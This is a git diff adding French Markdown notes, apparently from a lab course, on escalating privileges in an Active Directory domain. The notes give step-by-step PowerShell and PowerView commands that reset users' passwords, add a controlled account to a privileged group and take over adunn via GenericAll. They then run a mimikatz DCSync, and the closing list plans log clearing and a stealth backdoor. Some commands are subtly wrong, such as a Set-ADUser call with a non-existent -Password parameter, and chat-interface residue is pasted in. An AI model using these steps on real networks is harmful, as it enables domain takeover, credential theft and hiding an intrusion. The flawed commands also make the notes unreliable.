@@ -3140,7 +3140,110 @@ Sinon, nous devons **ouvrir une console PowerShell** et nous authentifier avec u
 $User = "Domaine\wley"
 $Password = ConvertTo-SecureString "MotDePasseEnClair" -AsPlainText -Force
 $Creds = New-Object System.Management.Automation.PSCredential($User, $Password)
+```
 
+
+Voici des notes détaillées en français, formatées en Markdown (attaque_active_directory_fr.md).
+
+md
+Copier
+Modifier
+# 🛠️ Attaque Active Directory – Escalade de privilèges
+
+## 📌 Contexte et Objectifs  
+
+Nous avons compromis l'utilisateur **wley** et récupéré son **hash NTLMv2** à l'aide de **Responder**.  
+Nous avons pu casser son mot de passe hors ligne avec **Hashcat** et obtenir sa version en clair.  
+
+### 🎯 Objectif final  
+- Prendre le contrôle de **adunn**, qui peut exécuter **DCSync** pour récupérer tous les **hashs NTLM** des utilisateurs du domaine.  
+- Élever nos privilèges jusqu'à **Domain Admin** ou **Enterprise Admin**.  
+- Maintenir un accès **persistant** au domaine.  
+
+---
+
+## 🔗 Chaîne d'attaque  
+
+1. **Utiliser `wley` pour modifier le mot de passe de `damundsen`**  
+2. **S'authentifier en tant que `damundsen` et utiliser `GenericWrite`** pour ajouter un utilisateur contrôlé au groupe **Help Desk Level 1**  
+3. **Exploiter les appartenances de groupe imbriquées** et utiliser **GenericAll** pour prendre le contrôle de `adunn`  
+
+---
+
+# 🔐 Abus des ACL – Changement de mot de passe via PowerView
+
+## 🛠️ Étape 1 : Création d'un objet PSCredential  
+
+Nous devons créer un **objet PSCredential** contenant les identifiants de l'utilisateur `wley`.
+
+```powershell
+$SecPassword = ConvertTo-SecureString '<MOT_DE_PASSE_ICI>' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
+```
+
+📌 Remplacez <MOT_DE_PASSE_ICI> par le mot de passe en clair de wley.
+
+🛠️ Étape 2 : Définition d'un nouveau mot de passe pour damundsen
+Créons un objet SecureString qui représente le nouveau mot de passe de damundsen.
+
+```powershell
+$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+```
+
+📌 Personnalisez le mot de passe selon vos besoins.
+
+🛠️ Étape 3 : Changer le mot de passe avec PowerView
+Nous allons utiliser la fonction PowerView Set-DomainUserPassword pour modifier le mot de passe de damundsen.
+
+1️⃣ Se rendre dans le dossier où se trouve PowerView :
+
+```powershell
+cd C:\Tools\
+```
+2️⃣ Importer le module PowerView :
+
+```powershell
+Import-Module .\PowerView.ps1
+```
+3️⃣ Changer le mot de passe de damundsen :
+
+```powershell
+Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
+```
+✅ Sortie attendue :
+
+```vbnet
+VERBOSE: [Get-PrincipalContext] Using alternate credentials
+VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'damundsen'
+VERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset
+```
+🔹 Étape 4 : Ajouter un utilisateur contrôlé au groupe "Help Desk Level 1"
+Une fois authentifiés en tant que damundsen, nous allons ajouter un utilisateur que nous contrôlons au groupe Help Desk Level 1
+Ce groupe possède des droits privilégiés, ce qui nous aidera à compromettre adunn ensuite.
+
+```powershell
+Add-ADGroupMember -Identity "Help Desk Level 1" -Members "notrehackeruser"
+```
+🔹 Étape 5 : Prendre le contrôle de adunn
+Nous allons exploiter les droits "GenericAll" et les appartenances de groupes imbriquées pour prendre le contrôle total de adunn.
+
+```powershell
+Set-ADUser -Identity adunn -Password (ConvertTo-SecureString "SuperMotDePasse!" -AsPlainText -Force)
+```
+
+Une fois cela fait, nous pouvons lancer DCSync avec mimikatz :
+
+```cmd
+mimikatz.exe "lsadump::dcsync /domain:MONDOMAINE /user:Administrator" exit
+```
+
+✅ Conclusion
+Nous avons escaladé nos privilèges jusqu'à Domain Admin, ce qui nous permet de contrôler entièrement le domaine et de maintenir un accès furtif et persistant.
+
+🚀 Prochaines étapes
+✔️ 🏴 Post-exploitation (dump des mots de passe, persistance)
+✔️ 🛡️ Nettoyage des logs pour masquer notre attaque
+✔️ 🎭 Création d'un backdoor pour un accès furtif
 ### DCSync
 
 
